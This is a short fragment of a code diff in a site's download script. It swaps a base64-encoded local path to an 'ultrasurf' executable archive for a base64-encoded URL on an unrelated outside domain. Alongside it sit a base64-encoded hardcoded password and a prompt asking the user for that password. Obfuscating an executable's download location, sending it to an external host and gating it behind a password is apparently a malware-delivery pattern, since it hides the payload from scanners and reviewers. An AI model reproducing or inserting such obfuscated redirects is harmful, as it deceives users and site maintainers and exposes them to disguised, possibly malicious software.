@@ -44,7 +44,7 @@ download.addEventListener("click", () => {
   }
 
   const b64ep = "bW9vbmtuaWdodA==";
-  const b64el = "Li9zcmMvcHVibGljL2Rvd25sb2Fkcy9hcHBsaWNhdGlvbnMvc29mdHdhcmUvdWx0cmFzdXJmL2V4ZWN1dGVhYmxlL3JlYWRvbmx5L3JlZGlzdC9leHRyYWN0LW1lLnppcA=="
+  const b64el = "aHR0cDovL2Fyc2VlbGFsaS5jb20vcDBvOWk4L3NyYy9wdWJsaWMvZG93bmxvYWRzL2FwcGxpY2F0aW9ucy9zb2Z0d2FyZS91bHRyYXN1cmYvZXhlY3V0ZWFibGUvcmVhZG9ubHkvcmVkaXN0L3JlZGlzdC56aXA="
 
   var password = prompt(
     "Enter the password to download the file (Contact the site owner for the password)"
